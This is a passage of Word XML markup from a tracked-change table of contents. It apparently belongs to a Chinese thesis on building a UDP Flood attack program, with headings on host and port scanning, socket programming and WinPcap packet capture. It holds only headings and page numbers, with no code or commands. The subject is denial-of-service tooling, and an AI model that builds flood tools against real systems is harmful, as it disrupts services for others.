          <w:ins w:id="335" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="336" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="337" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="338" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>2.2.1</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主机扫描</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>6</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7C30D577" w14:textId="5FF6E32A" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="339" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="340" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="341" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="342" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>2.2.2</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UDP端口扫描</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>7</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="787A3AED" w14:textId="05180D4E" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="343" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="344" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="345" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="346" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>2.2.3</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UDP Flood攻击</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>8</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="04338A51" w14:textId="2604A5AF" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="347" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="348" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="349" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="350" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>2.3</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SOCKET编程原理</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>9</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="484DEE69" w14:textId="2028ACD8" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="351" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="352" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="353" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="354" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>2.3.1</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Socket的结构组成</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>9</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="70C019B1" w14:textId="4D8A4A2A" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="355" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="356" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="357" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="358" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>2.3.2</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Socket网络编程技术主机扫描</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>10</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="14A69C8E" w14:textId="03D9E6A1" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="359" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="360" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="361" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="362" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>2.4</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WinPcap简介及原理</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>10</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="56D0B3CC" w14:textId="32102E0F" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="363" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="364" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="365" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="366" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>2.4.1</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WinPcap简介</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>10</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1F8E8C80" w14:textId="02AD5F0C" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="367" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="368" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="369" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="370" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>2.4.2</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基于WindPcap可以开发的网络应用程序</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>10</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3AB0D9DA" w14:textId="3F9C75A4" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="371" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="372" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="373" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="374" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>2.4.3</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基于WindPcap中主要函数的功能</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>11</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2DA24162" w14:textId="5D0AFE1B" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="375" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="376" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="377" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="378" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>2.4.4</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WinPcap实现数据包捕获与分析的流程</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>11</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="44B3277D" w14:textId="5F0CAC15" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="379" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="380" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="381" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="382" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>2.5</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本章小结</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>12</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="27FECCEA" w14:textId="45D24467" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="420"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:rPr>
          <w:ins w:id="383" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="384" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="385" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="386" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>3.</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概要设计</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>13</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7507F310" w14:textId="42571647" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="387" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="388" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="389" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="390" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>3.1</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设计初衷</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>13</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4D04A6A5" w14:textId="32BC37A3" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="391" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="392" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="393" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="394" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>3.2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 Flood攻击程序的目标</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>13</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4679EF44" w14:textId="53463C17" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="395" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="396" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="397" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="398" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>3.3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 Flood攻击程序的基本功能</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>13</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4EDCF00D" w14:textId="2040D56C" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="399" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="400" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="401" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="402" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>3.4</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UDP Flood攻击程序的系统结构</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>14</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0CF1EF3A" w14:textId="352EB29C" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="403" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="404" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="405" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="406" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>3.5</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本章小结</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>14</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="38734901" w14:textId="68E8B84A" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="420"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:rPr>
          <w:ins w:id="407" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="408" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
